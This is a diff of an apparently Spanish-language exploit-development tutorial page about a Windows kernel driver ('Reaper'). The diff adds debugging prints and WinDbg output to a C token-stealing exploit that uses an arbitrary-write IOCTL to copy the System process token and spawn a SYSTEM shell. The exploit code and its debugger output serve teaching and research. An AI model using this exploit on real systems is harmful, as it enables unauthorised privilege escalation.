@@ -1212,7 +1212,7 @@ PROCESS ffffba09b847a040
 }</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> explota un <a href="/exploit-development/windows-kernel/token-stealing">Token Stealing</a>, obtiene las direcciones de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> del proceso de <code class="language-plaintext highlighter-rouge">System</code> y la del proceso actual, luego escribe en la dirección del campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso System</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> explota un <a href="/exploit-development/windows-kernel/token-stealing">Token Stealing</a>, obtiene las direcciones de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> del proceso de <code class="language-plaintext highlighter-rouge">System</code> y la del proceso actual, luego escribe en la dirección del campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso System, con el fin de comprobar el funcionamiento establecemos varios <code class="language-plaintext highlighter-rouge">printf</code> y un <code class="language-plaintext highlighter-rouge">getchar</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="no">int</span><span class="na"> main</span><span class="p">() {
     </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">Reaper"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  
@@ -1222,15 +1222,87 @@ PROCESS ffffba09b847a040
         </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
     }
 
-    </span><span class="na">QWORD</span><span class="p"> systemEProcess</span><span class="o"> =</span><span class="p"> GetSystemEProcess(hDevice, GetKernelBase());
+    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();
+    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Kernel Base: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, kernelBase);
+
+    </span><span class="na">QWORD</span><span class="p"> systemEProcess</span><span class="o"> =</span><span class="p"> GetSystemEProcess(hDevice, kernelBase);
+    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] System _EPROCESS: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, systemEProcess);
+
     </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> GetCurrentEProcess(hDevice, systemEProcess);
+    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Current _EPROCESS: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, currentEProcess);
+
+    </span><span class="no">getchar</span><span class="p">();
 
     ArbitraryWrite(hDevice, systemEProcess </span><span class="o">+</span><span class="p"> OFFSET_Token, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_Token);
     </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
-
+    
     CloseHandle(hDevice);
     </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
 }</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit llega al <code class="language-plaintext highlighter-rouge">getchar</code> muestra 3 direcciones de memoria con <code class="language-plaintext highlighter-rouge">printf</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\user\Desktop> </span><span class="am">.\exploit.exe</span><span class="p">
+[*] Kernel Base: 0xfffff80009e07000
+[*] System _EPROCESS: 0xffff910748cba040
+[*] Current _EPROCESS: 0xffff91074edd5080  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La primera dirección es la base del kernel que podemos ver como el módulo <code class="language-plaintext highlighter-rouge">nt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0: kd></span><span class="p"> lm m nt
+Browse full module list
+start             end                 module name
+fffff800`09e07000 fffff800`0ae4e000   nt         (pdb symbols)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las otras 2 direcciones apuntal a la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de 2 procesos, el primero es de <code class="language-plaintext highlighter-rouge">System</code> y el segundo de nuestro exploit, en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> podemos ver sus valores del campo <code class="language-plaintext highlighter-rouge">Token</code>, hasta ahora todo es normal y cada uno es diferente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff910748cba040 ImageFileName  
+   +0x5a8 ImageFileName : [15]  "System"
+
+</span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff91074edd5080 ImageFileName  
+   +0x5a8 ImageFileName : [15]  "exploit.exe"
+
+</span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff910748cba040 + 0x4b8 Value
+   +0x000 Value : 0xffffb701`9c04c047
+
+</span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff91074edd5080 + 0x4b8 Value
+   +0x000 Value : 0xffffb701`a205281f</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Establecemos un breakpoint en el <code class="language-plaintext highlighter-rouge">mov</code> del driver y al llegar a el podemos ver guarda en <code class="language-plaintext highlighter-rouge">rax</code> el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code>, luego lo mueve como el contenido del registro <code class="language-plaintext highlighter-rouge">rcx</code> que apunta a la dirección donde se encuentra el <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0: kd></span><span class="p"> bp Reaper + 0x10be
+
+</span><span class="ro">0: kd></span><span class="p"> g
+Breakpoint 0 hit
+Reaper+0x10be:
+fffff800`101b10be 488b00          mov     rax,qword ptr [rax]  
+
+</span><span class="ro">0: kd></span><span class="p"> dqs rax L1
+ffff9107`48cba4f8  ffffb701`9c04c047
+
+</span><span class="ro">0: kd></span><span class="p"> p
+Reaper+0x10c1:
+fffff800`101b10c1 488901          mov     qword ptr [rcx],rax  
+
+</span><span class="ro">0: kd></span><span class="p"> dqs rcx L1
+ffff9107`4edd5538  ffffb701`a205281f</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al final de la ejecución ambos procesos tienen el mismo <code class="language-plaintext highlighter-rouge">Token</code>, y al proceso actual tener el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code> deberia obtener tambien sus privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0: kd></span><span class="p"> p
+Reaper+0x10c4:
+fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)  
+
+</span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff910748cba040 + 0x4b8 Value
+   +0x000 Value : 0xffffb701`9c04c047
+
+</span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff91074edd5080 + 0x4b8 Value
+   +0x000 Value : 0xffffb701`9c04c047</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Entonces, nuestro exploit a través de las funciones de los códigos <code class="language-plaintext highlighter-rouge">ioctl</code> escribe el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code> en el proceso actual, luego ejecuta <code class="language-plaintext highlighter-rouge">system("cmd.exe")</code> que al ejecutarlo nos devuelve una shell como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
